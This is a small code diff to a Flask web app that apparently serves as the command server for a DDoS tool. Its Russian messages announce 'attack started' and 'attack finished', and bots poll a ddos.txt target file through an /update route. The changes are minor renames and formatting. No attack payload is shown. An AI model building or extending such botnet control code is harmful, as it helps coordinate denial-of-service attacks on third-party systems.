@@ -16,7 +16,7 @@ def save_text(message):
         return 'Атака начата!'
 
 @app.route("/status")
-def get_status():
+def status():
     with open("status.txt", "r") as file2:
         stat = str(file2.read())
     return stat
@@ -27,13 +27,13 @@ def stop():
         file3.write("Stopped!")
     with open("ddos.txt", "w") as file4:
     	file4.write("")
-    return "Атака завершена!"
+        return "Атака завершена!"
 
 @app.route("/update")
 
 def update():
 	with open("ddos.txt", "r") as file5:
-	        return file5.read()
+	        return str(file5.read())
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080)
